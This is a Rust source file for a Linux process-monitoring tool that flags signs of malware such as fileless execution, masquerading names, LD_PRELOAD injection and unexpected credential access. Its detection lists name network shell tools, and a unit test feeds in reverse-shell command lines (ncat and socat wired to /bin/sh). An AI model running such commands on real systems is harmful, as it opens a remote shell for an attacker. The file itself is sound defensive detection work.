//! Vigil 1's process checks (tasks/procs.py `flags`), held to it by tests/golden/tasks.json.
//!
//! Each check reads only facts about one process and its parent, all from /proc (and, for
//! two checks, whether a package owns the program file). A check returns its id, severity,
//! strength and a sentence that completes "Process 812 (sshd, run by root) ...".

use crate::secrets::{self, basename};
use serde::{Deserialize, Serialize};
use std::collections::{BTreeMap, HashMap};

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct Secret {
    pub kind: String,
    pub label: String,
    pub path: String,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct SockFact {
    pub kind: String,
    pub local_ip: String,
    pub local_port: u32,
    #[serde(default)]
    pub remote_ip: String,
    #[serde(default)]
    pub remote_port: u32,
}

/// What the checks know about one process.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize, Default)]
pub struct ProcFacts {
    pub pid: u32,
    pub ppid: u32,
    pub comm: String,
    pub exe: Option<String>,
    pub exe_deleted: bool,
    pub cmdline: Vec<String>,
    pub name: String,
    /// A kernel thread (no program file, a child of kthreadd).
    pub kernel: bool,
    /// The program file without " (deleted)".
    pub path: Option<String>,
    /// The program file exists on disk now (an update replaced it).
    pub exists_now: bool,
    /// The package that owns the program file, and which package database was asked.
    pub package: Option<String>,
    pub package_db: Option<String>,
    /// Only the dynamic linker's variables from the environment (LD_PRELOAD, LD_AUDIT,
    /// LD_LIBRARY_PATH); nothing else from it is kept.
    #[serde(default)]
    pub ld: Option<BTreeMap<String, String>>,
    pub sockets: Vec<SockFact>,
    pub secrets: Vec<Secret>,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct Flag {
    pub check: &'static str,
    pub severity: &'static str,
    pub strength: f64,
    pub text: String,
}

const TEMP: [&str; 4] = ["/tmp/", "/var/tmp/", "/dev/shm/", "/run/shm/"];
const SHELLS: &[&str] = &["sh", "bash", "dash", "zsh", "fish", "ksh", "csh", "tcsh", "busybox", "pwsh", "powershell"];
const INTERPRETERS: &[&str] = &["python", "python3", "perl", "ruby", "node", "php", "lua", "osascript"];
const NETTOOLS: &[&str] = &["nc", "ncat", "netcat", "socat", "curl", "wget", "telnet"];
/// Programs that open untrusted content and should not start shells.
const APP_PARENTS: &[(&str, &str)] = &[
    ("firefox", "a web browser"),
    ("firefox-bin", "a web browser"),
    ("librewolf", "a web browser"),
    ("floorp", "a web browser"),
    ("zen", "a web browser"),
    ("chrome", "a web browser"),
    ("chromium", "a web browser"),
    ("brave", "a web browser"),
    ("vivaldi-bin", "a web browser"),
    ("opera", "a web browser"),
    ("msedge", "a web browser"),
    ("thunderbird", "the mail app"),
    ("evolution", "the mail app"),
    ("evince", "a document viewer"),
    ("okular", "a document viewer"),
    ("zathura", "a document viewer"),
    ("atril", "a document viewer"),
    ("soffice.bin", "LibreOffice"),
    ("libreoffice", "LibreOffice"),
    ("discord", "a chat app"),
    ("Discord", "a chat app"),
    ("slack", "a chat app"),
    ("telegram-desktop", "a chat app"),
    ("signal-desktop", "a chat app"),
    ("element-desktop", "a chat app"),
    ("teams", "a chat app"),
];
const SERVER_PARENTS: &[(&str, &str)] = &[
    ("nginx", "the web server"),
    ("apache2", "the web server"),
    ("httpd", "the web server"),
    ("php-fpm", "PHP"),
    ("lighttpd", "the web server"),
    ("mysqld", "the database"),
    ("mariadbd", "the database"),
    ("postgres", "the database"),
    ("redis-server", "Redis"),
];
/// Names malware borrows to blend in (the July 2026 AUR wave ran Tor as "dbus-daemon").
const SYSTEM_NAMES: &[&str] = &[
    "dbus-daemon",
    "dbus-broker",
    "systemd",
    "systemd-journald",
    "systemd-logind",
    "systemd-resolved",
    "systemd-timesyncd",
    "systemd-udevd",
    "systemd-networkd",
    "sshd",
    "cron",
    "crond",
    "atd",
    "rsyslogd",
    "NetworkManager",
    "wpa_supplicant",
    "polkitd",
    "udisksd",
    "upowerd",
    "accounts-daemon",
    "avahi-daemon",
    "cupsd",
    "pipewire",
    "wireplumber",
    "pulseaudio",
    "Xorg",
    "Xwayland",
    "gnome-shell",
    "kwin_wayland",
    "plasmashell",
    "gvfsd",
    "at-spi-bus-launcher",
    "xdg-desktop-portal",
    "agetty",
    "login",
    "bash",
    "sh",
];
const SYSTEM_DIRS: [&str; 9] =
    ["/usr/", "/bin/", "/sbin/", "/lib/", "/lib64/", "/opt/", "/nix/store/", "/snap/", "/app/"];
/// Hidden folders that tools install into on purpose (Vigil 1's exclusion list).
const KNOWN_HIDDEN: &[&str] = &[
    "/.local/",
    "/.nix-profile/",
    "/.cargo/",
    "/.rustup/",
    "/.npm/",
    "/.nvm/",
    "/.bun/",
    "/.deno/",
    "/.pyenv/",
    "/.sdkman/",
    "/.vscode/",
    "/.var/app/",
    "/.steam/",
];

fn lookup(table: &[(&str, &'static str)], k: &str) -> Option<&'static str> {
    table.iter().find(|(n, _)| *n == k).map(|(_, v)| *v)
}

/// Python's `s[:n]` (characters, not bytes).
fn head(s: &str, n: usize) -> String {
    s.chars().take(n).collect()
}

/// Python's `str.rstrip("0123456789.")`.
fn strip_version(s: &str) -> &str {
    s.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.')
}

/// `/\.[^/]+/`: a folder whose name starts with a dot (not the last part of the path).
pub fn in_hidden_folder(path: &str) -> bool {
    let parts: Vec<&str> = path.split('/').collect();
    parts.len() > 2 && parts[1..parts.len() - 1].iter().any(|c| c.len() > 1 && c.starts_with('.'))
}

fn is_word(c: char) -> bool {
    c.is_alphanumeric() || c == '_'
}

/// `(^|[\s/])(xdg-open|xdg-mime|gio|kde-open\d*|exo-open)\b`: a browser handing a link or a
/// file to the desktop's opener, which is normal.
fn harmless_child(cmd: &str) -> bool {
    let chars: Vec<(usize, char)> = cmd.char_indices().collect();
    for (n, (i, _)) in chars.iter().enumerate() {
        let starts = n == 0 || chars[n - 1].1.is_whitespace() || chars[n - 1].1 == '/';
        if !starts {
            continue;
        }
        let rest = &cmd[*i..];
        for name in ["xdg-open", "xdg-mime", "gio", "kde-open", "exo-open"] {
            if let Some(after) = rest.strip_prefix(name) {
                let after =
                    if name == "kde-open" { after.trim_start_matches(|c: char| c.is_ascii_digit()) } else { after };
                if !after.chars().next().is_some_and(is_word) {
                    return true;
                }
            }
        }
    }
    false
}

/// `\s-e\s|\bexec:|/bin/(ba)?sh`
fn shell_wired(cmd: &str) -> bool {
    let chars: Vec<char> = cmd.chars().collect();
    let dash_e = chars.windows(4).any(|w| w[0].is_whitespace() && w[1] == '-' && w[2] == 'e' && w[3].is_whitespace());
    let exec = cmd.match_indices("exec:").any(|(i, _)| cmd[..i].chars().next_back().is_none_or(|c| !is_word(c)));
    dash_e || exec || cmd.contains("/bin/sh") || cmd.contains("/bin/bash")
}

fn flag(check: &'static str, severity: &'static str, strength: f64, text: String) -> Flag {
    Flag { check, severity, strength, text }
}

/// The checks for one process (Vigil 1's `flags`).
pub fn flags(p: &ProcFacts, procs: &HashMap<u32, ProcFacts>, home: &str) -> Vec<Flag> {
    let mut out = vec![];
    if p.kernel {
        return out;
    }
    let path = p.path.as_deref().unwrap_or("");
    let home = home.trim_end_matches('/');
    let parent = procs.get(&p.ppid);
    let base_of = |exe: &str| basename(exe.strip_suffix(" (deleted)").unwrap_or(exe)).to_string();
    let pbase = match parent {
        Some(pa) if pa.exe.is_some() => base_of(pa.exe.as_deref().unwrap_or(&pa.comm)),
        Some(pa) => pa.comm.clone(),
        None => String::new(),
    };
    let base = {
        let b = base_of(p.exe.as_deref().unwrap_or(""));
        if b.is_empty() {
            p.comm.clone()
        } else {
            b
        }
    };
    let temp = TEMP.iter().any(|t| path.starts_with(t));
    if path.starts_with("/memfd:") {
        out.push(flag("memory_only", "High", 1.0, "runs from memory only (memfd): there is no file on disk".into()));
    } else if p.exe_deleted {
        match (&p.package, p.exists_now) {
            (Some(pkg), true) => out.push(flag(
                "replaced_binary",
                "Low",
                0.2,
                format!("its program file was replaced while it ran (probably an update of {pkg})"),
            )),
            _ => out.push(flag(
                "deleted_binary",
                "High",
                0.9,
                format!("its program file {path} was deleted while it kept running"),
            )),
        }
    }
    if temp {
        out.push(flag("temp_binary", "High", 0.9, format!("runs from a temporary folder ({path})")));
    } else if path.starts_with(&format!("{home}/.cache/")) || path.contains("/.cache/") {
        out.push(flag("cache_binary", "Medium", 0.7, format!("runs from a cache folder ({path})")));
    } else if path.contains("/Downloads/") {
        out.push(flag("downloads_binary", "Medium", 0.6, format!("runs straight from Downloads ({path})")));
    } else if in_hidden_folder(path) && !KNOWN_HIDDEN.iter().any(|k| path.contains(k)) {
        out.push(flag("hidden_binary", "Medium", 0.5, format!("runs from a hidden folder ({path})")));
    }
    for (var, val) in p.ld.iter().flatten() {
        if (var == "LD_PRELOAD" || var == "LD_AUDIT") && !val.trim().is_empty() {
            out.push(flag("ld_preload", "High", 0.9, format!("{var} forces {} into it", head(val, 120))));
        }
    }
    let cmd = p.cmdline.join(" ");
    if let Some(pa) = parent {
        let child_kind = SHELLS.contains(&base.as_str())
            || INTERPRETERS.contains(&strip_version(&base))
            || NETTOOLS.contains(&base.as_str());
        if child_kind {
            let kind = lookup(APP_PARENTS, &pbase).or_else(|| lookup(APP_PARENTS, &pa.comm));
            let srv = lookup(SERVER_PARENTS, &pbase).or_else(|| lookup(SERVER_PARENTS, &pa.comm));
            if let Some(kind) = kind {
                if harmless_child(&cmd) {
                    out.push(flag(
                        "odd_parent",
                        "Low",
                        0.2,
                        format!("{} ({kind}) opened something with {}", pa.name, head(&cmd, 80)),
                    ));
                } else {
                    out.push(flag(
                        "odd_parent",
                        "High",
                        0.9,
                        format!("{} ({kind}) started {base}: {}", pa.name, head(&cmd, 120)),
                    ));
                }
            } else if let Some(srv) = srv {
                out.push(flag(
                    "odd_parent",
                    "High",
                    0.9,
                    format!("{} ({srv}) started {base}: {}", pa.name, head(&cmd, 120)),
                ));
            }
        }
    }
    let system_name = SYSTEM_NAMES.contains(&p.comm.as_str());
    if (system_name || SYSTEM_NAMES.contains(&base.as_str()))
        && !path.is_empty()
        && !SYSTEM_DIRS.iter().any(|d| path.starts_with(d))
        && !path.starts_with("/memfd:")
    {
        out.push(flag(
            "masquerade_name",
            "High",
            0.9,
            format!("is named {} like a system program, but runs from {path}", p.comm),
        ));
    } else if system_name
        && !path.is_empty()
        && p.package.is_none()
        && p.package_db.as_deref().is_some_and(|d| !d.is_empty())
        && base != p.comm
        && !base.starts_with(&head(&p.comm, 6))
    {
        out.push(flag(
            "masquerade_name",
            "Medium",
            0.6,
            format!("is named {} like a system program, but its file {path} is a different program", p.comm),
        ));
    }
    if p.cmdline.first().is_some_and(|a| a.starts_with('[')) && p.exe.as_deref().is_some_and(|e| !e.is_empty()) {
        out.push(flag(
            "fake_kernel_name",
            "High",
            0.9,
            format!("calls itself {} like a kernel thread, but runs {path}", p.cmdline[0]),
        ));
    }
    if NETTOOLS.contains(&base.as_str()) && shell_wired(&cmd) {
        out.push(flag("reverse_shell", "High", 1.0, format!("looks like a reverse shell: {}", head(&cmd, 120))));
    }
    let odd = secrets::unexpected(p);
    if let Some(first) = odd.first() {
        let mut names = vec![basename(path).to_string(), p.comm.clone()];
        names.extend(p.cmdline.iter().take(1).map(|a| basename(a).to_string()));
        let risky = temp
            || path.contains("/.cache/")
            || path.contains("/Downloads/")
            || path.starts_with("/memfd:")
            || in_hidden_folder(path)
            || names.iter().any(|n| {
                SHELLS.contains(&n.as_str())
                    || INTERPRETERS.contains(&n.as_str())
                    || NETTOOLS.contains(&n.as_str())
                    || INTERPRETERS.contains(&strip_version(n))
            })
            || (p.package.is_none() && p.package_db.as_deref().is_some_and(|d| !d.is_empty()));
        let more = if odd.len() > 1 { format!(" and {} more", odd.len() - 1) } else { String::new() };
        let text = format!("has {} open ({}){more}, which is not its own", first.label, first.path);
        out.push(if risky {
            flag("credential_access", "High", 0.9, text)
        } else {
            flag("credential_access", "Medium", 0.6, text)
        });
    }
    let listening: Vec<&SockFact> =
        p.sockets.iter().filter(|s| s.kind == "listen" && (s.local_ip == "0.0.0.0" || s.local_ip == "::")).collect();
    if let Some(l) = listening.first() {
        if temp || path.contains("/.cache/") || path.contains("/Downloads/") {
            out.push(flag(
                "listens_from_odd_place",
                "High",
                0.8,
                format!("listens on port {} for the whole network while running from {path}", l.local_port),
            ));
        }
    }
    out
}

/// Titles per check, longest first (the finding format fits the first that fits).
pub fn titles(check: &str) -> &'static [&'static str] {
    match check {
        "memory_only" => &["{name} runs from memory with no file on disk", "A program runs from memory only"],
        "deleted_binary" => &["{name} keeps running after its file was deleted", "A program's file was deleted"],
        "replaced_binary" => &["{name} was updated while it was running", "A program was updated while running"],
        "temp_binary" => &["{name} runs from a temporary folder", "A program runs from a temporary folder"],
        "cache_binary" => &["{name} runs from a cache folder", "A program runs from a cache folder"],
        "downloads_binary" => &["{name} runs straight from Downloads", "A program runs straight from Downloads"],
        "hidden_binary" => &["{name} runs from a hidden folder", "A program runs from a hidden folder"],
        "ld_preload" => &["{name} has a library forced into it", "A program has a library forced into it"],
        "odd_parent" => &["{parent} started {child}", "{parent} started a shell", "An app started a shell"],
        "fake_kernel_name" => &["{name} pretends to be a kernel thread", "A program pretends to be a kernel thread"],
        "reverse_shell" => &["{name} looks like a reverse shell", "A program looks like a reverse shell"],
        "listens_from_odd_place" => {
            &["{name} listens for connections from an odd place", "A program listens from an odd place"]
        }
        "masquerade_name" => &["{name} pretends to be a system program", "A program pretends to be a system program"],
        "credential_access" => &[
            "{name} has your {secret} open",
            "{name} has one of your secrets open",
            "A program has one of your secrets open",
        ],
        _ => &["A process looks unusual"],
    }
}

/// Why each check matters, in Vigil 1's words.
pub fn why(check: &str) -> &'static str {
    match check {
        "memory_only" => "Programs normally run from a file; running only from memory is how fileless malware avoids leaving traces.",
        "deleted_binary" => "Malware often deletes its own file after starting, so nothing is left to find on disk.",
        "replaced_binary" => "After an update, running programs keep the old version until restarted. Harmless.",
        "temp_binary" => "Temporary folders are where downloaded payloads land; installed software lives in /usr or /opt.",
        "cache_binary" => "Cache folders hold data, not programs; a program here was put there by something.",
        "downloads_binary" => "Fine for an AppImage you chose to run; otherwise worth knowing what it is.",
        "hidden_binary" => "Hidden folders keep things out of sight; some tools install there, so does malware.",
        "ld_preload" => "LD_PRELOAD injects code into a program; debuggers and some games use it, so do rootkits.",
        "odd_parent" => "Browsers, mail and document apps open untrusted content; a shell under them is a classic sign of an exploit.",
        "fake_kernel_name" => "Kernel threads have no program file; a user program with a kernel-thread name is hiding.",
        "reverse_shell" => "A network tool wired to a shell hands control of this PC to someone elsewhere.",
        "listens_from_odd_place" => "A program accepting connections from the whole network should be installed software.",
        "credential_access" => "Stealing saved passwords, cookies, keys and wallets is what infostealers do, and they do it by \
                                opening these files. The program that owns a store, a backup tool or your editor holding it is \
                                normal; this program is none of those as far as Vigil can tell.",
        "masquerade_name" => "Malware borrows system program names so a glance at a process list looks normal; the July 2026 \
                              AUR malware ran its Tor client as \"dbus-daemon\".",
        _ => "",
    }
}

/// Who ran a process and when, for the finding's wording (not used by the checks).
pub struct Context<'a> {
    pub user: &'a str,
    pub started: Option<f64>,
    /// The parent chain, nearest first, as names.
    pub chain: Vec<String>,
    pub viewer_uid: u32,
    pub uid: u32,
    pub osr: &'a vigil_model::distro::OsRelease,
    pub now: f64,
}

/// Check and Fix options for a flagged process (Vigil 1's tasks/findings.py `fixes`).
/// Every command is shown to copy; stopping a process stays copy-only.
fn fixes(p: &ProcFacts, cx: &Context) -> vigil_model::fixes::FixPanel {
    use vigil_model::fixes::{option, owner_check, panel, Risk};
    let pid = p.pid;
    let own = cx.uid == cx.viewer_uid;
    let s = if own { "" } else { "sudo " };
    let mut check = vec![
        option(
            "Its details",
            "PID, parent, user, start time and full command line.",
            Risk::Safe,
            &[&format!("ps -o pid,ppid,user,lstart,args -p {pid}")],
            &[],
        ),
        option(
            "Where its program file is",
            "Shows the file /proc says it runs; '(deleted)' if gone.",
            Risk::Safe,
            &[&format!("{s}ls -l /proc/{pid}/exe")],
            &[],
        ),
        option(
            "Its fingerprint (SHA-256)",
            "Hashes the running binary, even if its file was deleted.",
            Risk::Safe,
            &[&format!("{s}sha256sum /proc/{pid}/exe")],
            &[],
        ),
    ];
    if let Some(path) =
        p.path.as_deref().filter(|x| ["/usr/", "/opt/", "/bin/", "/sbin/"].iter().any(|d| x.starts_with(d)))
    {
        check.push(owner_check(path, vigil_model::distro::family(cx.osr)));
    }
    let risk = if own { Risk::Settings } else { Risk::Admin };
    let mut fix = vec![option(
        "Pause it (reversible)",
        "Freezes the process without ending it, so you can look at it calmly.",
        risk,
        &[&format!("{s}kill -STOP {pid}")],
        &[&format!("{s}kill -CONT {pid}")],
    )];
    let again: String = p.cmdline.join(" ").chars().take(200).collect();
    let again = if again.is_empty() { p.name.clone() } else { again };
    fix.push(
        option(
            "End it",
            "Asks the process to quit (SIGTERM). Unsaved work in it is lost.",
            risk,
            &[&format!("{s}kill {pid}")],
            &[],
        )
        .with_steps(&[], &[&format!("Start it again if you need it: {again}")])
        .with_lose("Whatever it was doing."),
    );
    let odd = secrets::unexpected(p);
    if !odd.is_empty() {
        check.insert(
            0,
            option(
                "Every file it has open",
                "Lists its open files; look for the secrets named above.",
                Risk::Safe,
                &[&format!("{s}ls -l /proc/{pid}/fd")],
                &[],
            ),
        );
        let mut kinds: Vec<&str> = vec![];
        for x in &odd {
            if !kinds.contains(&x.kind.as_str()) {
                kinds.push(&x.kind);
            }
        }
        let steps: Vec<&str> = kinds.iter().map(|k| rotate(k)).collect();
        fix.push(
            option(
                "Assume what it opened was copied",
                "Pausing or ending the program does not take back what it already read. Replace what it held:",
                Risk::Settings,
                &[],
                &[],
            )
            .with_steps(&steps, &["Nothing to undo: new keys and passwords simply replace the old ones."]),
        );
    }
    panel(cx.osr, check, fix, None)
}

fn rotate(kind: &str) -> &'static str {
    match kind {
        "ssh_key" => {
            "SSH key: make a new one (ssh-keygen -t ed25519), put its .pub on your servers and remove the old \
                      public key from their ~/.ssh/authorized_keys."
        }
        "gpg_key" => "GnuPG key: revoke it (gpg --gen-revoke) and publish the revocation, then make a new key.",
        "browser_passwords" => {
            "Saved passwords: change them, starting with email and banking, and turn on two-factor sign-in."
        }
        "browser_cookies" => {
            "Cookies: sign out of every session (most sites offer \"sign out everywhere\"), then sign in again."
        }
        "browser_keys" => "Browser key: it unlocks saved passwords and cookies, so treat both as copied.",
        "password_db" => "Password database: change its master password, then the most important passwords inside it.",
        "keyring" => "Desktop keyring: change the passwords stored in it (Wi-Fi, accounts) and its own password.",
        "chat_token" => {
            "Chat login: change your password, which signs out every session, and turn on two-factor sign-in."
        }
        "wallet" => "Wallet: from a clean device, move the funds to a new wallet with a new seed phrase.",
        _ => "Cloud and developer credentials: revoke and re-create the keys and tokens in each provider's console.",
    }
}

/// One finding for one flag, in Vigil 1's format (tasks/findings.py `build`).
pub fn finding(
    p: &ProcFacts,
    procs: &HashMap<u32, ProcFacts>,
    f: &Flag,
    cx: &Context,
) -> Result<vigil_model::finding::Finding, vigil_model::finding::FindingError> {
    use vigil_model::finding::Builder;
    use vigil_model::wording::{fit_title, TITLE_MAX};
    let parent = procs.get(&p.ppid);
    let child = {
        let exe = p.exe.as_deref().unwrap_or("");
        let b = basename(exe.strip_suffix(" (deleted)").unwrap_or(exe));
        if b.is_empty() {
            p.comm.clone()
        } else {
            b.to_string()
        }
    };
    let odd = if f.check == "credential_access" { secrets::unexpected(p) } else { vec![] };
    let secret = odd.first().map_or(String::new(), |s| {
        let l = s.label.split(" (").next().unwrap_or(&s.label);
        let l = l.strip_prefix("an ").unwrap_or(l);
        let l = l.strip_prefix("a ").unwrap_or(l);
        l.strip_prefix("the ").unwrap_or(l).to_string()
    });
    let parent_name = parent.map_or("Its parent".to_string(), |x| x.name.clone());
    let candidates: Vec<String> = titles(f.check)
        .iter()
        .map(|t| {
            t.replace("{name}", &p.name)
                .replace("{parent}", &parent_name)
                .replace("{child}", &child)
                .replace("{secret}", &secret)
        })
        .collect();
    let title = fit_title(&candidates, TITLE_MAX);
    let summary = format!("Process {} ({}, run by {}) {}.", p.pid, p.name, cx.user, f.text);
    let mut b = Builder::new("tasks", f.check, &title, &summary, f.severity).signal_kind(&f.text, f.strength, f.check);
    let conns: Vec<&SockFact> = p.sockets.iter().filter(|s| s.kind == "connection").collect();
    if let Some(c) = conns.first() {
        b = b.signal_kind(
            &format!("has {} network connection(s), e.g. to {}:{}", conns.len(), c.remote_ip, c.remote_port),
            0.4,
            "network",
        );
    }
    // Vigil 1 says "belongs to no installed package" whenever none was found; Vigil 2 says it
    // only when a package database was actually asked (DECISIONS D-024).
    if p.package.is_none() && p.package_db.is_some() && p.path.is_some() && f.check != "replaced_binary" {
        b = b.signal_kind("its program file does not belong to any installed package", 0.3, "no_package");
    }
    let confidence = match f.severity {
        "High" => "High",
        "Medium" => "Medium",
        _ => "Low",
    };
    let path = p.path.clone().unwrap_or_else(|| "(none)".into());
    let chain = cx.chain.iter().rev().cloned().collect::<Vec<_>>().join(" → ");
    b = b
        .likely(why(f.check))
        .confidence(confidence, "Read from /proc for this process.")
        .subject(&format!("{}:{}:{}", path, f.check, p.pid))
        .fixes(fixes(p, cx))
        .evidence("process", format!("pid {}", p.pid), Some(&chain))
        .evidence("path", path.clone(), None);
    for s in odd.iter().take(8) {
        b = b.evidence("secret", s.path.clone(), Some(&s.label));
    }
    b = b
        .technical("command line", p.cmdline.join(" ").chars().take(500).collect::<String>())
        .technical("parent", parent.map_or("-".to_string(), |x| format!("{} {}", x.pid, x.name)))
        .technical("started", cx.started.map_or("-".to_string(), |t| format!("{t:.0}")))
        .technical("package", p.package.clone().unwrap_or_else(|| "none".into()))
        .data(format!("/proc/{}", p.pid))
        .when(cx.now);
    match f.check {
        "credential_access" => b = b.attack_ids(&secrets::attack(&odd)),
        "odd_parent" => {
            let server = ["web server", "PHP", "database", "Redis"].iter().any(|w| f.text.contains(w));
            b = b.attack_ids(if server { &["T1505.003", "T1059.004"] } else { &["T1203", "T1059.004"] });
        }
        _ => {}
    }
    b.make()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn matchers_follow_the_regular_expressions() {
        assert!(harmless_child("sh -c xdg-open https://x"));
        assert!(harmless_child("/usr/bin/kde-open5 file"));
        assert!(!harmless_child("sh -c xdg-opener"));
        assert!(!harmless_child("sh -c myxdg-open"));
        assert!(shell_wired("ncat 1.2.3.4 4444 -e /bin/sh"));
        assert!(shell_wired("socat tcp:x exec:/bin/sh"));
        assert!(!shell_wired("socat tcp:x myexec:/x"));
        assert!(!shell_wired("curl https://example.org"));
        assert!(in_hidden_folder("/home/a/.x/bin"));
        assert!(!in_hidden_folder("/home/a/.bashrc"));
        assert!(!in_hidden_folder("/home/a/./x"));
    }
}
